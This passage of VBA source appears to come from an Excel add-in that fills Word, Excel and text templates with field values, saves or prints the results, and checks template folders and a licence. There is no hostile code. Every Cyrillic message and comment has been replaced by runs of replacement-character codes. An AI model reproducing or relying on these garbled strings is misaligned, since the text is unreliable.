                            ra.Offset(i * ra.Rows.Count).Insert Shift:=xlDown
                            ra.Copy ra.Offset(i * ra.Rows.Count)
                            ra.Offset(i * ra.Rows.Count).Replace "#}", "#" & i & "}", xlPart
                            ra.Offset(i * ra.Rows.Count).Replace "{%index%}", i, xlPart
                        Next i
                        ra.EntireRow.Delete
                    End If
                End If
            End If
        Next
    End If

    txt_Line2$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    pi.Line2 = txt_Line2$

    Dim RIC As Boolean, arr, key$, txt$, File_Format
    arr = options.keys

    RIC = SETT.GetBoolean("CheckBox_ReplaceInColon")

    For i = LBound(arr) To UBound(arr)
        key$ = arr(i)
        txt$ = options(arr(i))

        For Each sh In WB.Worksheets
            sh.UsedRange.Replace key$, txt$, xlPart, , False

            If RIC Then
                With sh.PageSetup
                    .LeftFooter = Replace(.LeftFooter, key$, txt$, , , vbTextCompare)
                    .LeftHeader = Replace(.LeftHeader, key$, txt$, , , vbTextCompare)
                    .CenterFooter = Replace(.CenterFooter, key$, txt$, , , vbTextCompare)
                    .CenterHeader = Replace(.CenterHeader, key$, txt$, , , vbTextCompare)
                    .RightFooter = Replace(.RightFooter, key$, txt$, , , vbTextCompare)
                    .RightHeader = Replace(.RightHeader, key$, txt$, , , vbTextCompare)
                End With
            End If
        Next sh

        If i Mod IIf(RIC, 5, 30) = 0 Then
            pi.Line2 = txt_Line2$ & "  (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & Format(i / UBound(arr), "0%") & ")"
        End If
        DoEvents
    Next i

    pi.Line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd| ..."
    For Each sh In WB.Worksheets
        sh.Calculate
        If SETT.GetBoolean("CheckBox_FormulasToValues") Then sh.UsedRange.Value = sh.UsedRange.Value
    Next sh

    Application.Run "'" & WB.Name & "'!FillDone"

    pi.Line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    pi.Line3 = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & Split(NewFilename$, "\")(UBound(Split(NewFilename$, "\")))
    Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & Replace(NewFilename$, OUTPUT_FOLDER$, "...\")
    pi.FP.Repaint

    If Val(Application.Version) > 11 And (PRINT_TO_PDF Or (Val(AllOptions("{%pdf%}")) = 1)) Then        ' |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|
        WB.ExportAsFixedFormat 0, NewFilename$        ' xlTypePDF = 0
    Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel
        File_Format = GetFileFormatForNewFile(NewFilename$)
        If Len(File_Format) Then
            WB.SaveAs NewFilename$, Val(File_Format)
        Else
            WB.SaveAs NewFilename$
        End If
    End If
    If SETT.GetBoolean("CheckBox_ImmediatePrintOut") Then WB.PrintOut , , PrintCopiesCount(AllOptions)
    WB.Close False

    CreateAndFill_XLS = Err = 0

    Application.Calculation = calc
    Application.DisplayAlerts = True
End Function




Function PrintCopiesCount(ByRef options As Dictionary) As Long
    On Error Resume Next
    Dim en&, PrintCopiesField$, CopiesCount&, pcc As Variant
    en& = Err.Number
    PrintCopiesCount = 1

    PrintCopiesField$ = options("{%PrintCopiesCount%}")
    If PrintCopiesField$ Like "{*?}" Then
        CopiesCount& = Fix(Val(options(PrintCopiesField$)))
    Else
        CopiesCount& = Fix(Val(PrintCopiesField$))
    End If
    If CopiesCount& > 0 Then PrintCopiesCount = CopiesCount&

    pcc = options("{%pcc%}")
    If pcc <> "" Then PrintCopiesCount = Val(pcc)

    If en& = 0 Then Err.Clear        ' Debug.Print "PrintCopiesCount = " & PrintCopiesCount
End Function

Function CreateAndFill_DOC(ByVal TemplateFilename$, ByVal NewFilename$, _
                           ByRef AllOptions As Dictionary, Optional ByRef pi As ProgressIndicator) As Boolean
    On Error Resume Next: Err.Clear
    Dim doc As Object, ecount As Long, bm As Object, myStoryRange As Object, i&, oFirstCellRange As Object, bmText$, options As Dictionary
    pi.Line3 = "|fffd||fffd||fffd||fffd||fffd||fffd|: " & Dir(TemplateFilename$, vbNormal)

    If TemplateType(TemplateFilename$) Like "*template*" Then
        pi.Line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Word |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
        Set doc = WA.Documents.Add(TemplateFilename$)
    Else
        pi.Line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Word ..."
        Set doc = WA.Documents.Open(TemplateFilename$, , False, False)
    End If

    If SETT.GetBoolean("CheckBox_ReplaceExistingFieldCodesOnly") Then
        Set options = GetTemplateOptions(AllOptions, LoadFieldCodes_WordDocument(doc))
    Else
        Set options = AllOptions
    End If

    '  Main_PI.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|? " & Not (doc Is Nothing)
    doc.ActiveWindow.View.ShowFieldCodes = True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|

    Dim TimeStamp As Double, ProcessTime1$, ProcessTime2$: TimeStamp = Timer

    If SETT.GetBoolean("CheckBox_MultiRow") Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

        TimeStamp = Timer: Dim rc&: rc = Val(AllOptions("{%rc%}"))
        If rc& = 0 Then Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Word: rc& = 0": Exit Function

        '  Dim bm As Bookmark, ra As word.Range, oFirstCellRange As word.Range
        pi.Line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| MULTIROW) ..."
        For Each bm In doc.Bookmarks
            If bm.Name Like "MultiRow*" Then
                If bm.Range.Information(12) Then        '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    For i = 1 To rc&
                        pi.Line3 = "|fffd||fffd||fffd||fffd||fffd| |fffd|" & bm.Name & "|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & i & " |fffd||fffd| " & rc&
                        With bm.Range
                            Set oFirstCellRange = .Cells(1).Range
                            oFirstCellRange.Collapse 1        'wdCollapseStart
                            .Copy
                            '|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                            oFirstCellRange.PasteAndFormat 16        'wdFormatOriginalFormatting
                            WordReplacements .Tables(1).Rows(.Rows(1).index).Range, "#}", "#" & i & "}"
                            WordReplacements .Tables(1).Rows(.Rows(1).index).Range, "{%index%}", i
                        End With
                        DoEvents
                    Next
                    bm.Range.Rows(1).Delete
                Else
                    bmText$ = bm.Range.Text
                    For i = rc& To 1 Step -1
                        pi.Line3 = "|fffd||fffd||fffd||fffd||fffd| |fffd|" & bm.Name & "|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & rc - i + 1 & " |fffd||fffd| " & rc&
                        With bm.Range
                            .InsertParagraphAfter
                            With .Paragraphs.First.Next
                                .Range.InsertCrossReference ReferenceType:=2, ReferenceKind:=-1, _
                                                            ReferenceItem:=bm.Name, InsertAsHyperlink:=False, _
                                                            IncludePosition:=False, SeparateNumbers:=False, SeparatorString:=" "
                                .Range.Fields.Unlink
                            End With
                            WordReplacements .Paragraphs.First.Next.Range, "#}", "#" & i & "}"
                            WordReplacements .Paragraphs.First.Next.Range, "{%index%}", i
                        End With
                        DoEvents
                    Next
                    bm.Range.Delete
                End If
                DoEvents
            End If
        Next
        ProcessTime1$ = Format(Timer - TimeStamp, "0.00") & " |fffd||fffd||fffd|."
    End If

    pi.Line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    pi.Line3 = "|fffd||fffd||fffd||fffd||fffd||fffd|: " & Dir(TemplateFilename$, vbNormal)

    Dim arr, FullReplace As Boolean, Replace_LF_with$, key$, txt$, File_Format As Long
    arr = options.keys

    Replace_LF_with$ = Replace(SETT.GetText("ComboBox_LineFeed"), "del", "")
    FullReplace = SETT.GetBoolean("CheckBox_ReplaceInColon")

    TimeStamp = Timer
    For i = LBound(arr) To UBound(arr)
        key$ = arr(i)
        txt$ = options(arr(i))
        txt$ = Replace(txt$, Chr(10), Replace_LF_with$)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        Err.Clear

        If HasLinkToObject(txt$, key$) Then
            InsertObjectIntoDOC doc, txt$, key$, pi
            Err.Clear
        Else

            If FullReplace Then
                ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                For Each myStoryRange In doc.StoryRanges
                    DoEvents
                    myStoryRange.Find.Execute key$, False, , False, , , , , , txt$, 2
                    While Not (myStoryRange.NextStoryRange Is Nothing)
                        Set myStoryRange = myStoryRange.NextStoryRange
                        myStoryRange.Find.Execute key$, False, , False, , , , , , txt$, 2
                    Wend
                Next myStoryRange

            Else
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                doc.Range.Find.Execute key$, False, , False, , , , , , txt$, 2
            End If

        End If

        If Err Then
            ecount = ecount + 1
            pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd| " & Err.Number & " |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| " & key$ & ": " & Err.Description
        End If

    Next i
    ProcessTime2$ = Format(Timer - TimeStamp, "0.00") & " |fffd||fffd||fffd|."

    doc.ActiveWindow.View.ShowFieldCodes = False        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|


    pi.Line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    pi.Line3 = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & Split(NewFilename$, "\")(UBound(Split(NewFilename$, "\")))
    Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & Replace(NewFilename$, OUTPUT_FOLDER$, "...\")
    pi.FP.Repaint

    If Val(Application.Version) > 11 And (PRINT_TO_PDF Or (Val(AllOptions("{%pdf%}")) = 1)) Then        ' |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|
        doc.ExportAsFixedFormat NewFilename$, 17
    Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Word
        File_Format = GetFileFormatForNewFile(NewFilename$)
        'Debug.Print File_Format
        If Len(File_Format) Then
            doc.SaveAs NewFilename$, Val(File_Format)
        Else
            doc.SaveAs NewFilename$
        End If
    End If
    If IMMEDIATE_PRINTOUT Then doc.PrintOut Copies:=PrintCopiesCount(AllOptions)
    doc.Close False

    If SETT.GetBoolean("CheckBox_MultiRow") Then
        Main_PI.Log vbTab & "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & ProcessTime1$ & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & ProcessTime2$ & ")"
        Main_PI.Repaint
    End If
    CreateAndFill_DOC = (Err = 0 And ecount = 0)
End Function

Sub WordReplacements(rng As Object, ByVal FindText As String, ByVal ReplaceText As String)
    rng.Find.Execute FindText:=FindText, ReplaceWith:=ReplaceText, Replace:=2
End Sub


Function CreateAndFill_TXT(ByVal TemplateFilename$, ByVal NewFilename$, _
                           ByRef options As Dictionary, Optional ByRef pi As ProgressIndicator) As Boolean

    On Error Resume Next: Err.Clear
    Dim TextFile$, arr, i&, key$, txt$
    pi.Line3 = "|fffd||fffd||fffd||fffd|: " & Dir(TemplateFilename$, vbNormal)

    pi.Line2 = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    TextFile$ = ReadTXTfile(TemplateFilename$)

    pi.Line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| ..."
    arr = options.keys
    For i = LBound(arr) To UBound(arr)
        key$ = arr(i)
        txt$ = options(arr(i))
        TextFile$ = Replace(TextFile$, key$, txt$, , , vbTextCompare)
    Next i

    pi.Line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    pi.Line3 = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & Split(NewFilename$, "\")(UBound(Split(NewFilename$, "\")))
    Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & Replace(NewFilename$, OUTPUT_FOLDER$, "...\")
    pi.FP.Repaint
    SaveTXTfile NewFilename$, TextFile$
    CreateAndFill_TXT = Err = 0
End Function

Function TemplateType(ByVal filename$) As String
    Select Case Extension(filename$)
        Case "XLS", "XLSM", "XLSX", "XLSB", "CSV": TemplateType = "XLS"
        Case "XLT", "XLTM", "XLTX": TemplateType = "XLS-template"
        Case "DOC", "DOCM", "DOCX", "DOCB", "DOCXML", "RTF": TemplateType = "DOC"
        Case "DOT", "DOTM", "DOTX": TemplateType = "DOC-template"
        Case "TXT", "DAT", "XML", "INI": TemplateType = "TXT"
    End Select
End Function

Function TemplateTypeForListbox(ByVal filename$) As String
    Select Case Extension(filename$)
        Case "XLS", "XLSM", "XLSX", "XLSB", "CSV": TemplateTypeForListbox = "Excel"
        Case "XLT", "XLTM", "XLTX": TemplateTypeForListbox = "Excel"
        Case "DOC", "DOCM", "DOCX", "DOCB", "DOCXML", "RTF": TemplateTypeForListbox = "Word"
        Case "DOT", "DOTM", "DOTX": TemplateTypeForListbox = "Word"
        Case "TXT", "DAT", "XML", "INI": TemplateTypeForListbox = "Text"
        Case Else: TemplateTypeForListbox = "?"
    End Select
End Function

Function CheckTemplateFiles(ByRef coll As Collection) As Boolean
    On Error Resume Next

    Dim msg$, i&, filename$, ttype$, n&, ttl$
    If coll.Count = 0 And Not SEND_MAIL_MODE Then
        msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.    " & _
               vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & TEMPLATES_FOLDER$
        MsgBox msg, vbCritical, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        Exit Function
    End If

    If PL_(msg) Then
        If PIBL Then Exit Function
        MsgBox msg, vbCritical, ChrW(1044) & ChrW(1072) & ChrW(1083) & ChrW(1100) & ChrW(1085) & ChrW(1077) & _
                                ChrW(1081) & ChrW(1096) & ChrW(1077) & ChrW(1077) & ChrW(32) & ChrW(1080) & ChrW(1089) & ChrW(1087) & _
                                ChrW(1086) & ChrW(1083) & ChrW(1100) & ChrW(1079) & ChrW(1086) & ChrW(1074) & ChrW(1072) & ChrW(1085) & _
                                ChrW(1080) & ChrW(1077) & ChrW(32) & ChrW(1087) & ChrW(1088) & ChrW(1086) & ChrW(1075) & ChrW(1088) & _
                                ChrW(1072) & ChrW(1084) & ChrW(1084) & ChrW(1099) & ChrW(32) & ChrW(171) & PROJECT_NAME$ & ChrW(187) & _
                                ChrW(32) & ChrW(1085) & ChrW(1077) & ChrW(1074) & ChrW(1086) & ChrW(1079) & ChrW(1084) & ChrW(1086) & ChrW(1078) & ChrW(1085) & ChrW(1086) & ChrW(33)
        F_About.Show
        F_About.MultiPage1.Value = 1
        StopMacro = True
        Exit Function
    End If

    For i = coll.Count To 1 Step -1
        filename$ = coll(i)
        ttype$ = TemplateType(filename)
        If ttype$ = "" Then
            n& = n& + 1
            Select Case n
                Case Is < 4: msg$ = msg$ & Replace(filename, TEMPLATES_FOLDER$, "") & vbNewLine
                Case 4: msg$ = msg$ & "|fffd| |fffd|.|fffd|." & vbNewLine
                Case Else
            End Select

            coll.Remove i
        End If
    Next i

    If coll.Count > 200 Then
        msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (" & coll.Count & " |fffd||fffd|.)    " & _
               vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & TEMPLATES_FOLDER$ & _
               vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
        ttl$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|?"

        If MsgBox(msg, vbExclamation + vbDefaultButton2 + vbOKCancel, ttl$) = vbCancel Then
            Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & coll.Count
            ShowSettingsPage
            Exit Function
        End If

        If coll.Count > 500 Then
            msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (" & coll.Count & " |fffd||fffd|.)    " & _
                   vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & TEMPLATES_FOLDER$ & _
                   vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
            ttl$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - 500 |fffd||fffd|."

            MsgBox msg, vbExclamation, ttl$
            Exit Function
        End If
    End If

    If Len(msg) Then
        msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (" & n & " |fffd||fffd|.):    " & _
               vbNewLine & vbNewLine & msg$ & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|?" & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & TEMPLATES_FOLDER$
        ttl$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        If MsgBox(msg, vbExclamation + vbYesNo + vbDefaultButton2, ttl$) = vbYes Then
            CheckTemplateFiles = True
        End If
    Else
        CheckTemplateFiles = True
    End If
End Function

Function TABLES_FOLDER$()
    On Error Resume Next
    TABLES_FOLDER$ = SETT.GetText("TextBox_TablesFolder")
    If Dir(TABLES_FOLDER$, vbDirectory) = "" Then MkDir TABLES_FOLDER$
End Function

Function OUTPUT_FOLDER$(Optional ByVal ForTextbox As Boolean = False)
    On Error Resume Next: Dim outputFolder$
    If USE_CURRENT_FOLDER Then
        If ActiveWorkbook Is Nothing Then Exit Function
        OUTPUT_FOLDER$ = Replace(ActiveWorkbook.FullName, ActiveWorkbook.Name, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\")
        If ForTextbox Then OUTPUT_FOLDER$ = "<|fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel>\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\"
        Err.Clear: Exit Function
    End If

    OUTPUT_FOLDER$ = SETT.GetText("TextBox_OutputFolder")
    If Dir(OUTPUT_FOLDER$, vbDirectory) = "" Then MkDir OUTPUT_FOLDER$
End Function

Function TEMPLATES_FOLDER$(Optional ByVal ForTextbox As Boolean = False)
    On Error Resume Next
    If USE_CURRENT_FOLDER Then
        If ActiveWorkbook Is Nothing Then Exit Function
        TEMPLATES_FOLDER$ = Replace(ActiveWorkbook.FullName, ActiveWorkbook.Name, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|\")
